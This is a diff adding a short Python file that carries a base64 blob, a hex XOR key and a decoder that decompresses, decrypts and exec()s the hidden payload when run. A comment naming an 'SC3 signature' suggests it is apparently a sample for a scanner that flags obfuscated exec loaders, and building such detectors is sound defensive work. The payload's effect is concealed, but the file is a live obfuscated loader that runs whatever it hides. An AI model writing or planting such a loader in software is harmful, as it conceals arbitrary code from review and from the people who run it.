@@ -1,0 +1,13 @@
+f6EKSakTbd+Nt/uu/jrbfym/rdZiHkttL86GmGLqTPu0eVNaXHpOXH+999UVNYV5QNPJfxwsB3MCpY/+sn5pURK7E7adzZtjjPMWm95hG4gBVjd/+iqExKdQ2Ozw1yIa4Q3XO+6mV9qAA8Y7rm8QF8HzS3cf2fnPzuy/U/nhvT6qD2f16u74Bvx5KljdAUVY28Zf37fJfT80zvyAa1kch5Z+pnSDm8ZH1sMlXQXsA3UuV8uiv6tvlKq+EN0vC+SaSmAjj6XVtmXmzqTNTBYBjmLGH+sIdb+PpAsbHftgoOtj13nz9t+9vHIuG7R/Zbtq3//PkPg8An3A=="
+_K = bytes.fromhex("59b7f3f422b6b4c08ffaa32f")
+
+def _xor(buf, k):
+    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))
+
+def _decode():
+    inner = zlib.decompress(base64.b64decode(_OUTER))
+    return _xor(base64.b64decode(inner), _K).decode("utf-8")
+
+if __name__ == "__main__":
+    # SC3 signature: base64.b64decode(...) -> exec / compile near by
+    exec(compile(_decode(), "<runtime>", "exec"), {})
